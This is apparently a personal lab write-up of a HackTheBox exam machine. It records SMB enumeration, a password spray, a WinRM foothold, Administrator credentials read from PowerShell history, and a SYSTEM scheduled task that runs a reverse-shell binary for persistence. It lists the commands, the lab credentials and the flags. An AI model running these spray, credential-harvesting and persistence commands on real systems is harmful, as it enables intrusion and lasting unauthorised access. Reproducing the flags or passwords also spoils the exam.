#Status/Exam-Done #Type/Lab #Context/Redteam #Exam/CJCA

---
## Target Information

>[!INFO]- Target Information:
>```
>IP Address: 10.129.17.36 (also appeared as 10.129.13.130 across resets)
>Hostname:   WIN01.luminex.htb (inferred)
>OS:         Windows
>Platform:   HackTheBox CJCA Exam
>```

---
## Timeline

>[!INFO]- Timeline:
>```
>2026-04-25 — Nmap: SMB, RDP, WinRM identified
>2026-04-25 — Null session SMB confirmed; user list enumerated
>2026-04-25 — SMB password spray with employee credential list from NIX01 init.sql
>2026-04-25 — john:1234567890 authenticated; WinRM/evil-winrm access as john
>2026-04-25 — winPEAS run; Administrator credentials in PowerShell history discovered
>2026-04-25 — RDP as Administrator; dropped reverse shell, created scheduled task
>```

---
## Enumeration

### Port Scan Results

>[!INFO]- Port Scan Results:
>```
>nmap -oN WIN01-TCP-Ports -T5 -sT -p- -Pn <target-ip>
>
>PORT      STATE SERVICE
>135/tcp   open  msrpc
>139/tcp   open  netbios-ssn
>445/tcp   open  microsoft-ds (SMB)
>3389/tcp  open  ms-wbt-server (RDP)
>47001/tcp open  winrm
>```

### Service Enumeration

>[!INFO]- Service Enumeration:
>```
># SMB null session / guest enumeration
>nxc smb <target-ip> -u '' -p '' --users
>nxc smb <target-ip> -u guest -p '' --shares
># Null session allowed — user enumeration succeeded
>```

---
## Foothold

### Vulnerability Identified

>[!INFO]- Vulnerability Identified:
>```
>SMB password spray — credentials from NIX01 /root/.docker/init.sql contained
>john:1234567890, a valid local account on WIN01. Approximately 300 automated NTLM
>spray attempts before success. Credential discovered via the employee database
>extracted from the Luminex Ltd. database on NIX01.
>```

### Exploitation Steps

>[!INFO]- Exploitation Steps:
>```
># 1. Spray employee credentials over SMB
>nxc smb <target-ip> -u <userlist> -p 1234567890 --continue-on-success
># john authenticated successfully
>
># 2. WinRM shell as john
>evil-winrm -i <target-ip> -u john -p '1234567890'
>
># 3. Run winPEAS — it reads PowerShell history and flags Administrator credentials
># Found in: C:\Users\john\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
># Contents: $Username = Administrator / $Password = mdm0axd*EQM7xmq.krn
>```

---
## Privilege Escalation

### Vector Identified

>[!INFO]- Vector Identified:
>```
>Plaintext Administrator credentials in john's PowerShell history (PSReadline).
>A previous admin session used hardcoded credentials in Invoke-Command, which
>PSReadline logged verbatim. winPEAS flagged and read the history file.
>
>ConsoleHost_history.txt contents:
>  $Username = Administrator
>  $Password = mdm0axd*EQM7xmq.krn
>```

### Steps Taken

>[!INFO]- Steps Taken:
>```
># 1. Read PowerShell history directly
>type C:\Users\john\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
>
># 2. RDP as Administrator
>xfreerdp /u:Administrator /p:'mdm0axd*EQM7xmq.krn' /v:<target-ip>
>
># 3. Stage reverse shell via RDP session
># Copy revshell1337.exe to C:\Users\Administrator\AppData\Local\
>
># 4. Create scheduled task for persistence
>schtasks /create /tn "Check" /tr "C:\Users\Administrator\AppData\Local\revshell1337.exe" /sc minute /mo 2 /ru SYSTEM /f
>```

---
## Flags

>[!INFO]- Flags:
>```
>User (john):          e4e9a0efc1cf23b5c795484ad0504d66
>Root (Administrator): 96f0352867e0f6783791714b02b59e13
>```

---
## Loot

>[!INFO]- Loot:
>```
>john:1234567890                 — local user, SMB/WinRM access
>Administrator:mdm0axd*EQM7xmq.krn — plaintext in john's PowerShell history
>```

---
## Rabbit Holes

>[!INFO]- Rabbit Holes:
>```
>- crackmapexec (cme) is broken/deprecated — spent time trying apt, pipx, and manual
>  git clone installs before switching to nxc (netexec). nxc has an identical interface
>  and installs cleanly: pipx install netexec.
>
>- Stalled on initial access because the employee credential list from NIX01 init.sql
>  had not been fully retrieved before moving here. Had to return to NIX01 to collect
>  all user/password pairs before the spray succeeded.
>```

---
## Lessons Learned

>[!INFO]- Lessons Learned:
>```
>- crackmapexec is deprecated. Always use nxc (netexec) — same interface, actively
>  maintained. Install: pipx install netexec
>- Check PSReadline history early during Windows post-exploitation:
>  type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
>- Collect ALL credentials from Linux pivot hosts before attacking Windows targets.
>  Employee databases and init.sql files are high-yield pivot sources.
>```

---
## Related Concepts
- [[Windows Fundamentals]]
- [[Windows Remote Management]]
- [[SMB]]
- [[Windows PowerShell]]

## Related Playbooks
- [[Windows Pentest Playbook]]

## Related Tools
- [[NetExec]]
- [[evil-winrm]]
- [[PEASS-ng]]
- [[xfreerdp]]
- [[Nmap]]

---
## References / Images
- [[Assets/Images/CJCA/CJCA-WIN01-msf-module-options-1.png|MSF Module Options]]
- [[Assets/Images/CJCA/CJCA-WIN01-john-access-1.png|john SMB Access]]
- [[Assets/Images/CJCA/CJCA-WIN01-administrator-access-1.png|Administrator Access]]
- [[Assets/Images/CJCA/CJCA-WIN01-john-cred-reuse-user-flag-1.png|john Credential Reuse and User Flag]]
- [[Assets/Images/CJCA/CJCA-WIN01-admin-password-transcript-1.png|Administrator Password in PS History]]
- [[Assets/Images/CJCA/CJCA-WIN01-admin-login-root-flag-1.png|Administrator Login and Root Flag]]
- [[Assets/Images/CJCA/CJCA-WIN01-admin-login-root-flag-2.png|Administrator Login and Root Flag (alt)]]
